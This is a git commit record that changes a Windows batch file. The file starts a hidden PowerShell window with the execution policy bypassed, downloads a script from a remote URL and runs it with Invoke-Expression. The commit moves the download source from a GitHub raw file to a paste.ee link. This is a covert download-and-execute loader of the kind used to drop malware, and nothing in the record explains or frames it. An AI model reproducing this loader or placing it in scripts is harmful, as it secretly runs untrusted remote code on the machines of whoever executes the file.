3a8d1e67f51255fe21c13201b59ed788fad23603
k53xupn43 <digi2ocean@gmail.com>
2025-04-30 16:40:59 +0600

    Update file.bat

--- file.bat
+++ file.bat
@@ -2,4 +2,4 @@
 
 powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
 
-"Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/k53xupn43/i965652f/refs/heads/main/m.ps1').Content"
+"Invoke-Expression (Invoke-WebRequest -Uri 'https://paste.ee/r/bdEls24G').Content"
